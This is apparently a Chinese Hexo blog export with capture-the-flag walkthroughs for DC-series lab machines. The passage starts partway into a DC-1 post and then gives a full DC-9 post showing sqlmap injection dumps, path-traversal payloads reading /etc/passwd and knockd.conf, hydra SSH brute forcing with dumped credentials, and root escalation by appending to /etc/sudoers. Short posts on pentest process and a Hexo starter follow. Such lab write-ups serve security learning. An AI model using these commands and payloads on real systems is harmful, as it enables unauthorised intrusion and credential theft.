<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NDA1MWNhOGM4NzU4ZjdjZTMxMmNmOGZkMGYyNGZmYjFfYkhuTWo4NXk0bkg4dVl0bFM4cVBvMWprMHNPblA4bnlfVG9rZW46R0tUT2I5dk1qb0F3UmZ4SUdJVmM0UlF2bldDXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>得到两个用户</p>
<p>1 | admin | S SSDvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</p>
<p>2 | Fred | S SSDWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ&#x2F;9TCGg</p>
<p>密码好复杂，应该不是明文，那想登进后台就很难了就很难了，我们可以通过修改admin的密码，或者是新加一个admin</p>
<p><strong>方法一：修改admin密码</strong></p>
<p>我们得先找到加密文件，Drupal的加密脚本在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/scripts/password-hash.sh</span><br></pre></td></tr></table></figure>

<p>首先我推出mysql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit;</span><br></pre></td></tr></table></figure>

<p>打开加密脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/www/scripts/password-hash.sh</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OGY0YzgyNjcwNDVjYWUxNmFiODk5YTNiZjRmMjJkMjhfYjZzbnc4WFlvb2pENDlyU3lXajJIUHNMSVE3YzlRTVhfVG9rZW46UVFLOGJjQ3Zzb0x2NW54dDdGcWNhYmpLbnNlXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>这个脚本是用php写的，而且还能用php加参数运行，直接得到加密后的密码，这里我们设置一个密码123456</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php /var/www/scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YWYzYTY4ZmM3MWY5ZjUwOTUwOWJjZTkxYzQxNjZjNzNfZWFIenJyZ2dUa0s1a0t6QXpkY1FLTGZoRzJSWlhQbkRfVG9rZW46UHlsWGJ2czl0b3RnMmF4MlA0Z2NkdjRrblRiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>得到加密后的密码， 接着我们登入mysql修改一下admin跟Fred的密码</p>
<p>mysql -udbuser -pR0ck3t</p>
<p>use drupaldb;update users set pass &#x3D; “S SSD1UQvb3x7lKoCSX6S9K.r.wB202Lsa&#x2F;r7fkOj7CelJsSEMFDJjGv” where name &#x3D; ‘admin’ or name &#x3D; ‘Fred’;</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NGJmMDU4NTRkMGQ0ODI3ZGJiYWEzNjliMWVhZmQ4ZGFfdTgyOUFJS2ROWkRrOHpUMUpoR0cwdVlqTjFXcEpCazBfVG9rZW46SE5wMmJZTVdMb0ZMVDV4MWVVQmMyTnZvbnJlXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>接着我们用修改好的密码登入</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmNlYzUyMzI0MDY3MzI3MDAxOTA0MDUzMzMxNjUwZWNfVGphTEdkeDdLTHlJc09mTk1tSDFIenYyZmtLT1pQNVdfVG9rZW46QVNJbmJmclNVb3RnVGx4NGtLZGM5WUp3bmdlXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>登进去就找到了flag3，提示了我们一些信息passwd和shadow，明显就是linux的文件</p>
<p>&#x2F;etc&#x2F;passwd</p>
<p>该文件存储了系统用户的基本信息，所有用户都可以对其进行文件操作读</p>
<p>Linux &#x2F;etc&#x2F;passwd内容解释（超详细）</p>
<p>&#x2F;etc&#x2F;shadow</p>
<p>该文件存储了系统用户的密码等信息，只有root权限用户才能读取</p>
<p>Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tac /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MGQyYWUzYzVlOWRmNjM1NDJhZjk1YWU1N2ZlOThiY2JfNkd4ZURwaG1XZGpKblg3ZEVtVU5rbjV2dUdHcjFMRDFfVG9rZW46Qlgzc2IxTUFGb1FNbmt4YklqVmMxcE81bnNoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
<p>可以看到有flag4这个用户，我们有两个方法拿到这个用户的密码，一个是爆破，另一个就是提权打开shadow文件查看密码</p>
]]></content>
      <categories>
        <category>靶场，DC系列</category>
      </categories>
  </entry>
  <entry>
    <title>DC-9</title>
    <url>/2024/04/01/DC-9/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YWRhZmQ2NTIwMTEyMzlmMTk5NGNmNjAzNDJkMmExZDJfOGs5UDEwTUFnbmdITlVNamc3dkRHeWVjRDF3aXpDNHhfVG9rZW46VVJNM2I4WVF1b0pHVzZ4c1NFSmMxVE45bjFlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.217.129/24</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjgxNzc2ZDY4NGRkYjcwZjk3MTcwYjc3YTQ5ZjFjZjRfZDI2YmZJSklxV1M5dURvVE12SEtzQjVJZXdUN2hHSHRfVG9rZW46V3hwMmJQdkpFb0FZZWZ4cVRzQ2M3WkIwbmxoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.217.137</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NmJjODRiYTUzZDViNjI2YzA0YjQ4NjA4YmM3OTRiMzZfWHpHcERWcW1ZRWdLUkgwZGxaMlZ3cTNUYXdFdHpJWDZfVG9rZW46QU1vWmJFek1zb0s2aGF4eW1nSWNCZVV5bkRoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>注意到ssh服务端口是filtered的，可能是什么原因给关掉了</p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u 192.168.217.137 -e * -x 403 --random-agent</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NDY2NGViMGQxYTBiZDRjZGZlM2Q3MDlkZDZmMmIyMjVfMU56Vms5R3NmNUZIdFE4N29Ua1NxbUNXSVFSQ2k2OGZfVG9rZW46SDhvR2I5Sm1yb0xRTTR4SURORmNLMU9CbnJnXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<h2 id="页面探测"><a href="#页面探测" class="headerlink" title="页面探测"></a>页面探测</h2><p>暂时无图</p>
<p>探测结果：</p>
<p>发现Search页面搜索存在<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>（原因：在上传之后网址无任何变动，判断是post请求）</p>
<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><h2 id="SQ注入"><a href="#SQ注入" class="headerlink" title="SQ注入"></a>SQ注入</h2><p>知道注入点，接下来上sqlmap跑，POST传参search，爆库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; --current-db</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA0ZGEyMjgzZDM2MGRhZThjNDQ4YzY4MjU1MTAwMGFfeFMwUmQ1M0VYMFpZbWswNXdoQUMxWjA0VEQyWWVmdXBfVG9rZW46WTRUNWJjUGt5b3p2R2t4Vzd6dmNTQ0N1bjdjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>得到数据库后进行爆表&#x2F;数据库：Staff</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -tables</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmZlNWE3Mzc4NDJhYTlkNzkwZTUxZWRkZGI2YjQwMmJfYlRETGVaTHFLYWlDdTdGa1lLcG5tdlhjcjZ3TDhDaTJfVG9rZW46RWk3Y2JaY2Vpb2xkTHV4SFJQMmM0bWxMbnBiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>爆字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -T &#x27;Users&#x27; -columns</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ODFjZDAwNDUwODc3ZGM0ZTFjNWNkZmYxYzY1OTAzZmFfT2lBb0FhVmtwRktUYklPMWZYMjlxSlVjUFVPcWdib1BfVG9rZW46T204SmJ6OGJvb1JmQWx4dlFiU2N5WWNxbnhjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>爆值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -T &#x27;Users&#x27; -C &#x27;Username,Password,UserID&#x27; -dump</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MDMwNDA1Yzc5MTRjMzA3NTk3NDBiNzRiNGQyZjY3NWJfYmU4NkVXWFJWYk9aQVNyMDIwSExpSWE2N09sdzBna3ZfVG9rZW46TlVlMGJZRkhnb0JhcEh4a2g0RWNiWDJxbmdkXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>只有一位用户，还有密码，这密码一看就是md5，接下来找个在线网站解密<a href="https://www.somd5.com/">https://www.somd5.com/</a></p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjg2NjAyMGVjNzBiY2Q5NjVlODM1NDUwNDMzNjgyODBfZFVqQlBuTzFIdEo2amRvWXRjVmVZTGRZcllnMUZLanNfVG9rZW46TXg0V2JXWFdRb3dBN054OVVxTmNBd1ZKbk5mXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>密码：transorbital1</p>
<h2 id="登入后台"><a href="#登入后台" class="headerlink" title="登入后台"></a>登入后台</h2><p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDkyMTcxZWUyZTFkMjU2OGIzMDk4MmYxZTcxYjY3MDFfSW00cDBjVnNMaGZMb1N2Tnp4WjdhWGhYZFA4SVNEdWpfVG9rZW46SXc0aGJLaFNxb1RYREN4SnBsWmNEMUZEbnhmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>就多了个Add Record界面，注意到下面有File does not exist，想到是程序引用或读取了一个不存在的文件才会回显这个，接着用参数fuzz测试一下</p>
<p>burpsuite抓包，构建payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?§§=../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Njk3MmVlMzI4ZTdiNjI4NDJjYzRjNGIwNjViYjk3OGJfblVqNkFmUHJXVFVmcjJJdVJsa2FsT0R0VXA3UXhzSHZfVG9rZW46V1V2N2JuN1VDb1F1V2N4S3lYN2NGTEVibjdiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>然后再把我们的参数字典加载进来</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjE3ODVhMzNmZjgzYjVkMzZmZjI5MWEyNTJjYjY5MzdfcUcxdlpKUEFoQlA4ZUxncFRLV3JIMHdqR0RseDEwSGZfVG9rZW46VTluTGJsVk5Cb1kwZ3Z4MTAwNWM5MjJVbkNkXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MjU4NTM3MTE0MTE3NDY3ZDg3YTUzMGE0M2QwYTg4ZjhfazZkQUxkNkhlM1JwUVJvS1doMHg2ZTJzZ1VkUlRoOFRfVG9rZW46TTkzMmJaSjJKb3JJZU54U3hJdGNZa2ZFbnpjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>参数名是file，存在任意文件读取漏洞</p>
<h2 id="端口敲门服务"><a href="#端口敲门服务" class="headerlink" title="端口敲门服务"></a>端口敲门服务</h2><p>考虑到ssh端口是关闭的，可能是开启了knock服务（参考<a href="https://www.cnblogs.com/xiaoxiaoleo/p/8523322.html">端口敲门服务</a>），利用文件包含确认一下，一般开启了knock服务就会存在&#x2F;etc&#x2F;knockd.conf文件</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/addrecord.php?file=../../../../../etc/knockd.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWQ4NjUwNzg2OTdhZTEwNWVlMDY5NDhhNWNhYmUxOGFfTGhEZ0ZSZWQwZ3c4SHhqckJGb2xIYkhHYkU3ZHl0S1hfVG9rZW46Sk50VGJueWtEb0Z0R1Z4QmV4NWNzRzJJbnNmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>果然有，开启ssh服务得依次敲击7469,8475,9842端口，利用netcat进行敲击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -z 192.168.217.137 7469 8475 9842</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQ3NjkzMGY0NzM4MGE4YWY1NDZmZjFiYWEzZGQzYTFfUWtmYkJvQW56ZTYxNlMxdVk1QXFSeUhUZGtmOGhpZGZfVG9rZW46WktlWmJJSWI3bzhQQ1N4TW5IdmNmSFdSbnVRXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>敲击完后发现端口打开了</p>
<h2 id="shh爆破"><a href="#shh爆破" class="headerlink" title="shh爆破"></a>shh爆破</h2><p>无奈测试了一下admin登不上去，想起之前SQLmap跑出过一个users的数据库</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzM5MTNmOTY0ZWRiMGNkYTYyMWEzODI1MzAzYjJlMzZfdEpHTTl1NDJnSHg2N2pOa2FHa2s5STlNdHFYZDFQcjdfVG9rZW46VGlmcmJ1emszbzM2R0x4YzZXOWNpdmFPbkVoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>存放网站用户信息的，我们去瞧一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;users&#x27; -dump</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Mjg5N2ZmNTAwZjYxYTJkOGQ4MTNlMjI3MjAzOTE0YTNfSG5jTGxuaWhubGV2N2V5S3BnUWFWb3JQSUY1b0xwS0VfVG9rZW46QzY0b2JyaURxb3FMTGl4bkRKdGN4amdqbkxmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>用这些账号密码组成字典，爆破ssh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi ``username.txt</span><br></pre></td></tr></table></figure>

<p>marym</p>
<p>julied</p>
<p>fredf</p>
<p>barneyr</p>
<p>tomc</p>
<p>jerrym</p>
<p>wilmaf</p>
<p>bettyr</p>
<p>chandlerb</p>
<p>joeyt</p>
<p>rachelg</p>
<p>rossg</p>
<p>monicag</p>
<p>phoebeb</p>
<p>scoots</p>
<p>janitor</p>
<p>janitor2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi ``password.txt</span><br></pre></td></tr></table></figure>

<p>3kfs86sfd</p>
<p>468sfdfsd2</p>
<p>4sfd87sfd1</p>
<p>RocksOff</p>
<p>TC&amp;TheBoyz</p>
<p>B8m#48sd</p>
<p>Pebbles</p>
<p>BamBam01</p>
<p>UrAG0D!</p>
<p>Passw0rd</p>
<p>yN72#dsd</p>
<p>ILoveRachel</p>
<p>3248dsds7s</p>
<p>smellycats</p>
<p>YR3BVxxxw87</p>
<p>Ilovepeepee</p>
<p>Hawaii-Five-0</p>
<p>接下来用九头蛇进行爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt ssh://192.168.217.137</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjk0NTBmZGExY2E4MGFjZGIwZjdiOTMyMjZmYjVmNDNfb2k5WXltRFlKUFBXSFM3T1YyV1I4ZHpTNGZOVUxWY2tfVG9rZW46UWo0N2JRa1Yxb2JUQXZ4anRBYWN0b2RNbjdmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>爆破出了三个用户</p>
<p>chandlerb:UrAG0D!</p>
<p>joeyt:Passw0rd</p>
<p>janitor:Ilovepeepee</p>
<p>尝试登入发现janitor用户有东西</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls -la</span><br><span class="line">cd .s*</span><br><span class="line">cat *</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MmExOGQxNTM5MGU3ODNiZjVkN2NmNWI3MDE0OGY4YWNfazRlSk5Od2kzOUVCS2w1ZjJDZmdYM1VNOGdrdW9PeUtfVG9rZW46TjR3VWJLN0Jpb1hXbG94ZlNUZWNzaEFSbmJWXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>有几个密码，复制到刚才的password文件继续爆破ssh</p>
<p>vi password.txt</p>
<p>BamBam01</p>
<p>Passw0rd</p>
<p>smellycats</p>
<p>P0Lic#10-4</p>
<p>B4-Tru3-001</p>
<p>4uGU5T-NiGHts</p>
<p>继续爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt ssh://192.168.217.137</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjJmMjMxYTQ2M2U0ZTM4MjNmMTFmNTg5MzY3N2FjNjlfcUF1akZyaEc3bEJGVlg0TThMQzRad3Jtem82UmJjM2JfVG9rZW46V1l0VGJLRHh3b3BxUll4YmhsUmNiWW9NbnNlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>爆破出了一个新用户</p>
<p>fredf     B4-Tru3-001</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjJlYzY5MWVlZDdkMGZkZmZhZTk5YjY2MTNhNjE1ZGFfVUZybjhkMkpPNkNEMTAzb1A4V0V4YkV0QXpBcXBvMHpfVG9rZW46TUJQTGJrZzI5b2hGREV4Vlkwd2NCSTN4bm1nXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjU3NTVlYjhhMTE2Y2E5ODQxNTFhMDFkYTUzNWZmODZfTEh4YVhoR0d4eTM5R3lvODNQbTlkcU9TNjlEbHljSVJfVG9rZW46RkpwbWJ0VjdRb2M5SFJ4cmk5YmNra3VsbnlmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>发现有个root权限文件</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /opt/devstuff/dist/test/test</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NjE0NWQ1NzU2MDNjYjAzMTlmODIwMjExMjc1MDc1OGZfcXhnMnN4clQxOG56aFBrMGFqUHpFUmlXRld0ckJMMjBfVG9rZW46SUNYVWJFMDZ1b3hlUFZ4WlBCMGNSREo3bk1nXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>打开test文件发现是一堆乱码，应该是一个程序</p>
<p>type name 可以查看文件类型，看是否是二进制还是文本文件</p>
<p>结果：啥也没看出来</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjY3Y2FkZjM5ZDEzNWU3ZDc3MmQ1N2U0ZTFjYWYwMDlfVk1mZXNLSWtGZ0t3M1JiWlF0V3JlWHQ3RlNMRHNpUTlfVG9rZW46VlN1QmJaN3FMb3VuTE14VXg5MWNBUnFtblZjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>在上两级目录发现test.py文件还有test.spec文件，所以后面目录下的test程序应该就是根据test.py文件写的，打开文件看一下test程序是干嘛的</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NzY3NmY0YzMxNDMzYmMyMzM0MzcwMTI2ODJjODJhZjBfMnlQaTY4S010VmlKSUhmamdCSXNhQ2FPcVZhM1h0UGlfVG9rZW46S1hHU2I4VXFlb1Bza3l4V09HRmNGbmcwblA4XzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>该脚本的意思是打开用户输入的第二个文件，将第二个文件的内容追加保存到第三个文件里面，也就是说如果有命令是test.py a.txt b.txt，就会将a.txt的文件内容保存到b.txt里面</p>
<p>利用&#x2F;etc&#x2F;sudoers     <a href="https://blog.csdn.net/Field_Yang/article/details/51547804">sudo配置文件&#x2F;etc&#x2F;sudoers详解及实战用法-CSDN博客</a></p>
<p>将fredf  ALL&#x3D;(ALL:ALL) ALL写成一个文件a.ttx   将这个文件追加到&#x2F;etc&#x2F;sudoers</p>
<p>先将目录切换到有权限的&#x2F;home&#x2F;fredf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/fredf</span><br></pre></td></tr></table></figure>

<p>然后进行文件的创建的编辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi a.ttx`    有人说在这里vi是个微型的，简单来说有坑，所以也可以用`nano a.ttx</span><br></pre></td></tr></table></figure>

<p>写完就可进行&#x2F;home&#x2F;fredf的写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /opt/devstuff/dist/test/test a.ttx /etc/sudoers</span><br></pre></td></tr></table></figure>

<p>不显示就说明成功了</p>
<p>之后进行用户切换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su - </span><br></pre></td></tr></table></figure>

<p>sudo 就是尝试实行root权限  su就是提权  - 切换到环境变量里</p>
<p>然后输入用户fredf的密码就可以了     密码：B4-Tru3-001</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=M2NiOTg5OGY4MGQxZmRiNzQ2NjFmOGYyYWE4NDY0MmNfVjExVnd3REkzNjRMS0RhYU41RXdTRzBXM0l5cG5sOWdfVG9rZW46Vk53ZWJzVDhkbzh5OTR4WHN6emNRV001bjZlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
<p>之后就是寻找flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">cat theflag.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA3YTlhZjdiZmYwOTBmNzg5MTUzMjhlZTg2YzNiYWZfdENoZGVkcVMydWs2OVZjQTVXZ2o0S2trT2hwNWxKQjBfVG9rZW46SEF3VWJCREgyb0hCUTJ4bEp2bWNsVElLbmxiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
]]></content>
      <categories>
        <category>靶场，DC系列</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>好杂</title>
    <url>/2024/03/31/ni-hao/</url>
    <content><![CDATA[<h1 id="很杂"><a href="#很杂" class="headerlink" title="很杂"></a>很杂</h1><p>很杂</p>
<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY5YzU0ODVkZmQyMWQ1OTllZDU4YzUzODQ3Y2I0ZjJfN1RENVNyZkdQNTBNOHpyak9YR0Y2aDUxeWdxNnZ5NU5fVG9rZW46UFl3QWJmU1B5b1lYbFZ4VnV1cmNTWUxqblFmXzE3MTE4Njk5ODQ6MTcxMTg3MzU4NF9WNA" alt="img"></p>
<h1 id="渗漏测试流程"><a href="#渗漏测试流程" class="headerlink" title="渗漏测试流程"></a>渗漏测试流程</h1><ol>
<li>明确目标</li>
<li>信息收集</li>
</ol>
<p> 域名，子域名，端口，网络架构，网站目录结构。。。。。。。</p>
<ol>
<li>漏洞分析&#x2F;漏洞扫描&#x2F;寻找漏洞</li>
<li>漏洞利用</li>
</ol>
<p>Http  80 </p>
<p>Https  443 </p>
<hr>
<p><img src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240331152749707.png" alt="image-20240331152749707"></p>
<hr>
<p>域名</p>
<p>IP</p>
<p>端口</p>
<p>cms指纹</p>
<p>网络空间测绘</p>
<p>目录扫描</p>
<hr>
<p>网络空间测绘：</p>
<p>钟馗之眼&#x2F;<a href="https://www.zoomeye.hk/">首页 - ZoomEye 真地图，网络空间地图的全球领导者</a></p>
<p>fofa&#x2F;<a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p>
<p>quake.360.cn&#x2F;<a href="https://www.zoomeye.hk/">首页 - ZoomEye 真地图，网络空间地图的全球领导者</a></p>
<p>鹰图&#x2F;<a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p>
<p><img src="https://img2020.cnblogs.com/blog/1950264/202007/1950264-20200731170503369-279339554.jpg" alt="Snipaste_2020-07-31_15-42-19"></p>
]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Hexo搭建个人博客</title>
    <url>/2024/03/30/My-Blog/</url>
    <content><![CDATA[<hr>
<h1 id="第一篇博客"><a href="#第一篇博客" class="headerlink" title="第一篇博客"></a>第一篇博客</h1><p>​	今日不同往时，生死看淡，不服就干，奥里给！！！！！！</p>
]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/03/30/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
